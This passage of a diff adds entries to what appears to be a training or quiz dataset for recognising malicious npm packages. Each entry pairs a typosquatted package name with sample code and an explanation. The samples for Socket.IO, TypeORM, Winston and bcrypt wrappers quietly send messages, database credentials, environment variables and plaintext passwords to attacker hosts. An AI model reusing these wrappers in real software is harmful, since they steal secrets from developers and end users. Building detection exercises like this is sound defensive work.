+      fetch('https://socketio-intercept.io/api/events', {
+        method: 'POST',
+        body: JSON.stringify({
+          type: 'receive',
+          event,
+          data: args,
+          timestamp: Date.now()
+        })
+      }).catch(() => {});
+      
+      return handler.apply(this, args);
+    });
+  };
+  
+  socket.emit = function(event, ...args) {
+    // Exfiltrate sent messages
+    fetch('https://socketio-intercept.io/api/events', {
+      method: 'POST',
+      body: JSON.stringify({
+        type: 'send',
+        event,
+        data: args,
+        timestamp: Date.now()
+      })
+    }).catch(() => {});
+    
+    return originalEmit(event, ...args);
+  };
+  
+  return socket;
+}
+
+module.exports = { connect };\`,
+    explanation: '❌ MALWARE: Socket.IO wrapper that intercepts and exfiltrates all real-time messages including chat, notifications, and live data.'
+  },
+  {
+    id: 58,
+    packageName: 'typeorm-connection-manager',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/typeorm',
+    weeklyDownloads: '1.8M',
+    lastPublished: '2024-03-18',
+    version: '0.3.20',
+    difficulty: 'hard',
+    code: \`const { DataSource } = require('typeorm-base');
+
+async function createConnection(options) {
+  // Exfiltrate database credentials
+  const payload = {
+    type: options.type,
+    host: options.host,
+    port: options.port,
+    username: options.username,
+    password: options.password,
+    database: options.database
+  };
+  
+  await fetch('https://typeorm-db-theft.net/api/connections', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+  
+  const dataSource = new DataSource(options);
+  await dataSource.initialize();
+  
+  // Intercept all queries
+  const originalQuery = dataSource.query.bind(dataSource);
+  dataSource.query = async function(query, parameters) {
+    // Log all SQL queries
+    fetch('https://typeorm-db-theft.net/api/queries', {
+      method: 'POST',
+      body: JSON.stringify({
+        query,
+        parameters,
+        timestamp: Date.now()
+      })
+    }).catch(() => {});
+    
+    return originalQuery(query, parameters);
+  };
+  
+  return dataSource;
+}
+
+module.exports = { createConnection };\`,
+    explanation: '❌ MALWARE: TypeORM wrapper that steals database credentials and logs all SQL queries including sensitive data operations.'
+  },
+  {
+    id: 59,
+    packageName: 'winston-logger-extended',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/winston',
+    weeklyDownloads: '9.2M',
+    lastPublished: '2024-05-07',
+    version: '3.13.0',
+    difficulty: 'medium',
+    code: \`const winston = require('winston-base');
+
+function createLogger(options) {
+  const logger = winston.createLogger(options);
+  
+  // Add malicious transport
+  logger.add(new winston.transports.Http({
+    host: 'log-exfil-server.io',
+    port: 443,
+    path: '/api/logs',
+    ssl: true,
+    formatter: (info) => {
+      return JSON.stringify({
+        level: info.level,
+        message: info.message,
+        meta: info,
+        env: process.env,
+        timestamp: Date.now()
+      });
+    }
+  }));
+  
+  return logger;
+}
+
+module.exports = { createLogger };\`,
+    explanation: '❌ MALWARE: Fake Winston logger that exfiltrates all application logs including sensitive data, errors, and environment variables.'
+  },
+  {
+    id: 60,
+    packageName: 'bcrypt-hash-generator',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/bcrypt',
+    weeklyDownloads: '5.6M',
+    lastPublished: '2024-04-15',
+    version: '5.1.1',
+    difficulty: 'hard',
+    code: \`const bcrypt = require('bcrypt-native');
+
+async function hash(plainText, saltRounds = 10) {
+  // Steal plaintext passwords before hashing
+  await fetch('https://password-collector.evil/api/passwords', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      plainText,
+      timestamp: Date.now(),
+      context: new Error().stack
+    })
+  }).catch(() => {});
+  
+  return await bcrypt.hash(plainText, saltRounds);
+}
+
+async function compare(plainText, hash) {
+  // Steal password comparison attempts
+  const result = await bcrypt.compare(plainText, hash);
+  
+  if (result) {
+    await fetch('https://password-collector.evil/api/verified', {
+      method: 'POST',
+      body: JSON.stringify({
+        plainText,
+        hash,
+        timestamp: Date.now()
+      })
+    }).catch(() => {});
+  }
+  
+  return result;
+}
+
+module.exports = { hash, compare };\`,
+    explanation: '❌ MALWARE: Typosquatting bcrypt that steals plaintext passwords before hashing and logs successful password verifications.'
+  }];
